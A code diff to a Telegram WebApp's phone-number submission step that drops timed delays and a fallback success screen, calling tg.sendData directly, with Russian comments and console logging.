@@ -375,7 +375,7 @@
 
             console.log('📱 Submitting phone:', authData.phone);
             authData.isProcessing = true;
-    
+
     // Показываем загрузку
             showStep('loading-step');
             document.getElementById('loading-title').textContent = 'Отправка номера...';
@@ -390,24 +390,13 @@
             console.log('📤 Sending payload:', payload);
 
             try {
-        // Небольшая задержка для визуализации
-                setTimeout(() => {
-                    console.log('🚀 Calling tg.sendData()...');
-                    tg.sendData(payload);
-                    console.log('✅ tg.sendData() called, WebApp should close now');
-            
-            // На случай если WebApp не закроется автоматически
-                    setTimeout(() => {
-                        authData.isProcessing = false;
-                        console.log('⚠️ WebApp still open after 3 seconds');
-                
-                // Показываем сообщение об успехе
-                        showStep('success-step');
-                        document.querySelector('#success-step h1').textContent = 'Данные отправлены!';
-                        document.querySelector('#success-step .subtitle').textContent = 
-                            'Код отправлен в Telegram.\nВернитесь в чат с ботом для ввода кода.';
-                    }, 3000);
-                }, 500);
+        // Отправляем данные через sendData
+                console.log('🚀 Calling tg.sendData()...');
+                tg.sendData(payload);
+                console.log('✅ tg.sendData() called successfully');
+        
+        // WebApp автоматически закроется и бот получит данные
+        // Больше ничего делать не нужно - бот пришлёт клавиатуру
         
             } catch (error) {
                 console.error('❌ Error sending data:', error);
